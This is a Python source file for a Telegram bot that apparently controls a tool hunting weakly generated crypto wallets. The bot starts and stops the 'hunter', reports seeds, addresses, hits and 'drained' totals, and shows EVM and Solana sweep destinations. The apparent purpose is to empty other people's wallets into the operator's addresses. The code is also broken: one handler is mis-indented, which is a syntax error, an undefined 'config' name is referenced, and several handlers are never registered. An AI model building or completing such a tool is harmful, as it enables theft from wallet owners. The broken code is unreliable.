"""Telegram control bot."""
from __future__ import annotations

import asyncio
import logging

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

from .config import Settings
from .notifier import Notifier
from .scanner import scan
from .store import Store
from .worker import Hunter

log = logging.getLogger("bot")


def build(s: Settings) -> Application:
    if not s.tg_token:
        raise SystemExit("TELEGRAM_BOT_TOKEN missing")
    store = Store(s.db_path)
    notifier = Notifier(s.tg_token, s.tg_chat)
    state: dict = {"h": None}

    def ok(u: Update) -> bool:
        return not s.tg_chat or str(u.effective_chat.id) == str(s.tg_chat)

    async def start(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        if state["h"]:
            await u.message.reply_text("already running")
            return
        state["h"] = Hunter(s, store, notifier)
        asyncio.create_task(state["h"].run())
        await u.message.reply_text(
            f"hunting family={s.family} shard={s.shard}")

    async def stop(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        if state["h"]:
            state["h"].stop()
            state["h"] = None
            await u.message.reply_text("stopped")
        else:
            await u.message.reply_text("not running")

    async def stats(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        h = state["h"]
        if not h:
            await u.message.reply_text(f"idle · {store.count()} total hits")
            return
        await u.message.reply_text(
            f"{h.cursor.family} {h.cursor.progress():.4f}%\n"
            f"seeds {h.seeds:,}\naddr {h.addrs:,}\n{h.rate():.0f}/s\n"
            f"hits {h.hits}\ndrained {h.swept}")

    async def hits(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        rows = store.recent(10)
        if not rows:
            await u.message.reply_text("no hits")
            return
        await u.message.reply_text(
            "\n".join(f"{c} {a} {amt} {ad} {v or ''}" for _, c, a, amt, ad, v in rows))

    async def check(u: Update, c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        if not c.args:
            await u.message.reply_text("usage: /scan <address>")
            return
        m = await u.message.reply_text("scanning…")
        await m.edit_text("\n".join(await scan(s, c.args[0].strip())))

    async def fam(u: Update, c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        if c.args and c.args[0] in ("repeat", "pair", "pool", "sequential"):
            s.family = c.args[0]
            await u.message.reply_text(f"family → {s.family} (restart to apply)")
        else:
            await u.message.reply_text("usage: /family repeat|pair|pool|sequential")
            
        async def setv(u: Update, c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        if len(c.args) < 2:
            await u.message.reply_text("usage: /set <key> <value>")
            return
        from . import overrides
        await u.message.reply_text(overrides.save(c.args[0], c.args[1]))

    async def show(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        await u.message.reply_text(
            f"family {s.family} shard {s.shard}/{s.shards}\n"
            f"dry_run {s.sweep.dry_run} sweep {s.sweep.enabled}\n"
            f"dest_evm {s.sweep.destination_evm or '—'}\n"
            f"dest_sol {s.sweep.destination_sol or '—'}")

    async def pull(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        import subprocess
        if state["h"]:
            state["h"].stop()
        r = subprocess.run(["git", "pull", "--ff-only"], capture_output=True,
                           text=True, cwd=str(config.ROOT))
        await u.message.reply_text(
            (r.stdout + r.stderr).strip()[-800:] or "nothing to pull")
        import sys
        sys.exit(0)

    async def restart(u: Update, _c: ContextTypes.DEFAULT_TYPE):
        if not ok(u):
            return
        await u.message.reply_text("restarting")
        import sys
        sys.exit(0)

    app = Application.builder().token(s.tg_token).build()
    for name, fn in [("start", start), ("stop", stop), ("stats", stats),
                     ("hits", hits), ("scan", check), ("family", fam)]:
        app.add_handler(CommandHandler(name, fn))
    return app